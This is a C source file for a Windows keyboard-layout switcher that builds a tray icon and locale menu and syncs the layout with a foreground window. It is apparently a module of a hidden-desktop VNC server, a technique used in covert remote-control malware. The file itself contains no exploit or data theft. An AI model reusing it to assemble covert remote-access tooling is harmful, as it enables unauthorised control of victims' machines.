#include "..\includes.h"
#include "layoutswitcher.h"
#include "kbd.h"
#include "windows.h"
#include "vnc_func.h"
#include "events.h"

bool CALLBACK LayoutSwitcherDialogProc(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam)
{
    PHVNC lpServer=(PHVNC)GetWindowLong(hWnd,GWLP_USERDATA);
    switch (uMsg)
    {
        case WM_CREATE:
        {
            lpServer=(*(PHVNC*)lParam);
            SetWindowLong(hWnd,GWLP_USERDATA,(LPARAM)lpServer);

            WORD bmMaskBits[16]={0};
            HFONT hFont=CreateFont(-11,0,0,0,FW_NORMAL,FALSE,FALSE,FALSE,EASTEUROPE_CHARSET,OUT_DEFAULT_PRECIS,CLIP_DEFAULT_PRECIS,DEFAULT_QUALITY,DEFAULT_PITCH+FF_DONTCARE,_T("Tahoma"));
            HDC hDC=GetDC(0);
            HDC dcGDI=CreateCompatibleDC(hDC);
            HBITMAP hbmGDI=CreateCompatibleBitmap(hDC,ICONWIDTH,ICONHEIGHT);
            SelectObject(dcGDI,hFont);
            SelectObject(dcGDI,hbmGDI);
            SetTextColor(dcGDI,0x0ffffff);
            SetBkColor(dcGDI,0x0ff0000);
            HBRUSH hbrGDI=CreateSolidBrush(0x0ff0000);
            ICONINFO ii= {0};
            ii.hbmColor=hbmGDI;
            ii.hbmMask=CreateBitmap(ICONWIDTH,ICONHEIGHT,1,1,&bmMaskBits);
            ii.fIcon=TRUE;

            RECT r={0};
            r.right=ICONWIDTH;
            r.bottom=ICONHEIGHT;

            HMENU hMenu=lpServer->LayoutSwitcherInfo.hMenu=CreatePopupMenu();
            for (int i=0; i<dwLocalesNum; i++)
            {
                TCHAR szBuf[260];
                VerLanguageName((DWORD)hklLocales[i],szBuf,260);
                AppendMenu(hMenu,MF_STRING,(UINT_PTR)hklLocales[i],szBuf);

                GetLocaleInfo(LOWORD(hklLocales[i]),LOCALE_SISO639LANGNAME,szBuf,260);
                memcpy(lpServer->LayoutSwitcherInfo.liInfo[i].szLoc,szBuf,2*sizeof(TCHAR));

                FillRect(dcGDI,&r,hbrGDI);
                DrawText(dcGDI,lpServer->LayoutSwitcherInfo.liInfo[i].szLoc,2,&r,DT_VCENTER+DT_SINGLELINE+DT_CENTER);
                lpServer->LayoutSwitcherInfo.liInfo[i].hIcon=CreateIconIndirect(&ii);
                lpServer->LayoutSwitcherInfo.liInfo[i].dwLayout=(UINT_PTR)hklLocales[i];
            }

            AppendMenu(hMenu,MFT_SEPARATOR,0,0);
            AppendMenu(hMenu,MF_STRING+MF_BYCOMMAND,IDM_AUTODETECT,_T("Autodetect layouts"));
            lpServer->LayoutSwitcherInfo.dwLayout=(UINT)GetKeyboardLayout(GetWindowThreadProcessId(lpServer->lpGlobalVNCData->hForegroundWnd,0));
            CheckMenuRadioItem(hMenu,(UINT)hklLocales[0],(UINT)hklLocales[dwLocalesNum-1],lpServer->LayoutSwitcherInfo.dwLayout,MF_BYCOMMAND);

            for (int i=0; i<dwLocalesNum; i++)
            {
                if (lpServer->LayoutSwitcherInfo.liInfo[i].dwLayout == lpServer->LayoutSwitcherInfo.dwLayout)
                {
                    lpServer->LayoutSwitcherInfo.nid.hIcon=lpServer->LayoutSwitcherInfo.liInfo[i].hIcon;
                    break;
                }
            }

            lpServer->LayoutSwitcherInfo.nid.cbSize=sizeof(lpServer->LayoutSwitcherInfo.nid);
            lpServer->LayoutSwitcherInfo.nid.uCallbackMessage=WM_TRAYMENU;
            lpServer->LayoutSwitcherInfo.nid.hWnd=hWnd;
            lpServer->LayoutSwitcherInfo.nid.uFlags=NIF_ICON+NIF_MESSAGE;
            lpServer->LayoutSwitcherInfo.nid.uID=1;
            while (!Shell_NotifyIcon(NIM_ADD,&lpServer->LayoutSwitcherInfo.nid))
                Sleep(1);

            DeleteObject(hFont);
            DeleteObject(ii.hbmMask);
            DeleteObject(hbrGDI);
            DeleteObject(hbmGDI);
            DeleteDC(dcGDI);

            SetTimer(hWnd,0,1,NULL);
            break;
        }

        case WM_CLOSE:
        {
            EndDialog(hWnd,0);
            break;
        }

        case WM_TRAYMENU:
        {
            if ((lParam == WM_RBUTTONUP) || (lParam == WM_CONTEXTMENU))
            {
                POINT p=lpServer->lpGlobalVNCData->ptCursor;
                TrackPopupMenu(lpServer->LayoutSwitcherInfo.hMenu,0,p.x,p.y,0,hWnd,NULL);
            }
            else if (lParam == WM_LBUTTONDBLCLK)
                SendMessage(hWnd,WM_COMMAND,IDM_AUTODETECT,0);
            else if (lParam == WM_LBUTTONUP)
                SendMessage(lpServer->lpGlobalVNCData->hForegroundWnd,lpServer->lpGlobalVNCData->dwVNCMessage,VMW_CHANGELAYOUT,(LPARAM)HKL_NEXT);
            break;
        }

        case WM_TIMER:
        {
            HKL lay=GetKeyboardLayout(GetWindowThreadProcessId(lpServer->lpGlobalVNCData->hForegroundWnd,0));
            if (lpServer->LayoutSwitcherInfo.dwLayout != (UINT)lay)
                SendMessage(hWnd,WM_COMMAND,(WPARAM)lay,0xDEAD);
            break;
        }

        case WM_COMMAND:
        {
            switch (LOWORD(wParam))
            {
                case IDM_AUTODETECT:
                {
                    bool bAuto=(lpServer->lpGlobalVNCData->bAutodectLayout == false);
                    CheckMenuItem(lpServer->LayoutSwitcherInfo.hMenu,IDM_AUTODETECT,((bAuto) ? MF_CHECKED : MF_UNCHECKED)+MF_BYCOMMAND);
                    lpServer->lpGlobalVNCData->bAutodectLayout=bAuto;
                    break;
                }
                default:
                {
                    if (HIWORD(wParam) >= 0x400)
                    {
                        for (int i=0; i<dwLocalesNum; i++)
                        {
                            if (lpServer->LayoutSwitcherInfo.liInfo[i].dwLayout == wParam)
                            {
                                lpServer->LayoutSwitcherInfo.nid.hIcon=lpServer->LayoutSwitcherInfo.liInfo[i].hIcon;
                                break;
                            }
                        }
                        CheckMenuRadioItem(lpServer->LayoutSwitcherInfo.hMenu,(UINT)hklLocales[0],(UINT)hklLocales[dwLocalesNum-1],wParam,MF_BYCOMMAND);
                        Shell_NotifyIcon(NIM_MODIFY,&lpServer->LayoutSwitcherInfo.nid);
                        lpServer->LayoutSwitcherInfo.dwLayout=wParam;
                        if (lParam != 0xDEAD)
                            SendMessage(lpServer->lpGlobalVNCData->hForegroundWnd,lpServer->lpGlobalVNCData->dwVNCMessage,VMW_CHANGELAYOUT,(LPARAM)wParam);
                    }
                }
            }
            break;
        }
    }
    return true;
}

static TCHAR szClass[]=_T("layswitch");

void WINAPI LayoutSwitcher(PHVNC lpServer)
{
    SetThreadDesktopEx(lpServer->hDesktop);
    WNDCLASS wc={0,(WNDPROC)LayoutSwitcherDialogProc,0,0,NULL,NULL,NULL,NULL,NULL,szClass};
    wc.hInstance=GetModuleHandle(0);
    RegisterClass(&wc);
    CreateWindow(szClass,0,0,1,1,1,1,NULL,NULL,wc.hInstance,lpServer);
    lpServer->LayoutSwitcherInfo.bSwitcherStarted=true;

    while (WaitForSingleObject(lpServer->EventsInfo.hVNCKillEvent,0) == WAIT_TIMEOUT)
    {
        MSG msg;
        if (!GetMessage(&msg,NULL,0,0))
            break;
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    for (int i=0; i<dwLocalesNum; i++)
        DestroyIcon(lpServer->LayoutSwitcherInfo.liInfo[i].hIcon);
    DestroyMenu(lpServer->LayoutSwitcherInfo.hMenu);
    lpServer->LayoutSwitcherInfo.bSwitcherStarted=false;
    return;
}

void StartLayoutSwitcher(PHVNC lpServer)
{
    if (lpServer->LayoutSwitcherInfo.bSwitcherStarted)
        return;
    SysCreateThread(lpServer,(LPTHREAD_START_ROUTINE)LayoutSwitcher,lpServer,true);
    return;
}

